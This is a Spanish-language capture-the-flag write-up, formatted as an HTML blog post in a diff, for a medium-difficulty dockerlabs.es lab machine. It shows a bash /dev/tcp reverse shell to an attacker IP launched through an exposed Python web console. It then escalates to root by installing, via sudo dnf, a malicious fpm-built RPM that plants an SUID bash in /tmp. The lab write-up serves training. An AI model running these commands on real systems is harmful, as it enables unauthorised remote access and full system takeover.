@@ -1,0 +1,128 @@
+<p>Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es .
+Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , envio de revshell y escalada de privelegios.</p>
+
+<h2 id="herramientas-y-recursos-usados">HERRAMIENTAS Y RECURSOS USADOS</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>Python</li>
+  <li>Sudo</li>
+  <li>fpm</li>
+  <li>https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-1-creating-a-malicious-rpm-package</li>
+</ul>
+
+<h2 id="empezamos">Empezamos</h2>
+
+<p>Como al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , como comprobar la conexion con un ping.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 172.17.0.2
+</code></pre></div></div>
+
+<p>Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sSVC</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-A</span> <span class="nt">-vvv</span> 172.17.0.2
+</code></pre></div></div>
+
+<p><img src="assets/pyred/nmap.png" alt="800x600" /></p>
+
+<p>Observamos el resultado y vemos que solo tiene el puerto 5000 abierto , por lo tanto la entrada esta en esa web asi que vamos a revisarla.</p>
+
+<p><img src="assets/pyred/web_term_Python.png" alt="800x600" /></p>
+
+<p>El codigo fuente no muestra nada pero por lo que parece es un shell interactivo de python , asi que probamos a ejecutar comandos.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">loco</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="infiltración">Infiltración</h2>
+<p>Como hemos comprobado si que ejecuta, así que intentamos mandarnos una revshell.
+Para ello antes de ejecutar la rev nos colocamos a la escucha en la maquina atacante.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 443
+</code></pre></div></div>
+
+<p>y en la victima ejecutamos:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">bash -c bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="assets/pyred/nc.png" alt="800x600" /></p>
+
+<p>Ya tenemos la revshell y podemos trabajar directamente en el objetivo y pasamos a escalar privilegios.</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Como siempre empezaremos por lo mas basico buscando ficheros con permisos erroneos scripts con suid.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+<span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+<p><img src="assets/pyred/find.png" alt="800x600" /></p>
+
+<p><img src="assets/pyred/sudo.png" alt="800x600" /></p>
+
+<p>El comando find no devuelve nada aprovechable de momento , pero sudo nos da la idea de como atacar puesto que el usuario primpi puede ejecutar dnf que es un gestor de paquetes de fedora.</p>
+
+<p>Podemos usar gtfobins para averiguar como explotar esa vulnerabilidad.</p>
+
+<p>Yo tengo instalado searchbins y ejecuto , donde  -b es el binario al que tenemos acceso y -f indica la funcion que utilizaremos para acceder al binario</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./searchbins.sh <span class="nt">-b</span> dnf <span class="nt">-f</span> <span class="nb">sudo</span>
+</code></pre></div></div>
+
+<p>El searchbins me devuelve lo siguiente:</p>
+
+<p>It runs commands using a specially crafted RPM package. Generate it with <a href="https://github.com/jordansissel/fpm">fpm</a> and upload it to the target.</p>
+
+<p>Descargamos e instalamos la herramienta para crear el rpm.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s1">'id'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
+fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> rpm <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
+</code></pre></div></div>
+
+<p>Debemos crear un  rpm malicioso en nuestra maquina atacante , lo cual lo podemos hacer con los comandos anteriores y una vez lo tengamos subirlo a la maquina victima e instalarlo.
+Usaremos los siguientes comandos.</p>
+
+<p>En maquina atacante :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
+</code></pre></div></div>
+
+<p>Y el la victima :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-O</span> http://ipatacante/rpmcreado
+<span class="nb">sudo </span>dnf <span class="nb">install</span> <span class="nt">-y</span> rpmcreado.rpm
+</code></pre></div></div>
+
+<p>Yo personalmente no acabo de entender que es lo que hacen exactamente esos comandos así que busque otra forma de hacerlo que fuera mas entendible para mi , así que hice lo siguiente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>exploit_rpm
+</code></pre></div></div>
+
+<p>Creo un script en el directorio creado anteriormente con el siguiente contenido.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">cp</span> /bin/bash /tmp/bash
+<span class="nb">chmod</span> +xs /tmp/bash
+</code></pre></div></div>
+
+<p>Una vez creado el script hago uso de la herramienta fpm que hemos instalado anteriormente , yo al ser usuario de arch no tengo instalado rpmbuild asi que me lance un VM de kali para realizar esa tarea y ejecute :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fpm <span class="nt">-n</span> exploit <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> rpm <span class="nt">--before-install</span> ./exploit/exploit.sh ./exploit
+
+Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span class="s2">"exploit-1.0-1.x86_64.rpm"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Ahora que ya lo tenemos creado solo tendremos que enviarlo a la maquina objetivo y instalarlo y ejecutarlo como explique antes el ultimo comando que utilizo para ser root es :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/bash <span class="nt">-p</span>
+</code></pre></div></div>
+
+<p>Como observamos ya estamos como superuser.</p>
+
+<p><img src="assets/pyred/id.png" alt="800x600" /></p>
+
+<p>Hasta aqui llegamos , un saliudo y gracias por leer.</p>
